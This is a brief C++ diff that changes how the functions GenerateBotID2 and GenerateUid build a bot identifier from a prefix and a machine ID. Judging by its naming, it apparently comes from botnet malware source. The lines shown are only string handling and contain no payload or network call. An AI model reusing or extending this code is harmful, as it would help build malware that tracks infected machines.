@@ -439,14 +439,13 @@ PCHAR MakeMachineID()
 //------------------------------------------------------------
 string GenerateBotID2(const char* Prefix)
 {
-	if (STRA::IsEmpty(Prefix))
-		Prefix = GetPrefix();
+	string Result = Prefix;
 
-	string Result;
+	if (Result.IsEmpty())
+		Result = GetPrefix();
 
 	PCHAR tmp_BotUid = MakeMachineID();
 
-	Result += Prefix;
 	Result += "0";
 	Result += tmp_BotUid;
 
@@ -459,7 +458,7 @@ void GenerateUid(char *BotUid)
 {
 	PCHAR tmp_BotUid = MakeMachineID();
 
-	m_lstrcpy( BotUid, GetPrefix());
+	m_lstrcpy( BotUid, GetPrefix().t_str());
 	m_lstrcat( BotUid, "0" );
 	m_lstrcat( BotUid, tmp_BotUid );
 	STR::Free(tmp_BotUid);
